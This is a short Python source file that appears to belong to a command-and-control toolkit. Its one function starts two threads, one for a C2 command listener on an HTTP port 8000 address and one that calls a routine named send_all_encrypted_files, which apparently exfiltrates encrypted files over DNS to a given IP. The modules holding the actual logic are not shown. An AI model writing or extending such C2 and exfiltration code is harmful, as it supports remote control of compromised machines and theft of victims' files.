import c2_dns
import command_c2
import os
import threading
def c2_server(ip,filename,ip_crypt): 
    print("c2 server started")
    c2_c= threading.Thread(target=command_c2.c2_command_start,args=(ip,'http://'+ip+':8000'))
    c2_c.start()
    c2_file=threading.Thread(target=c2_dns.send_all_encrypted_files,args=(filename,ip_crypt,ip,0))
    c2_file.start()

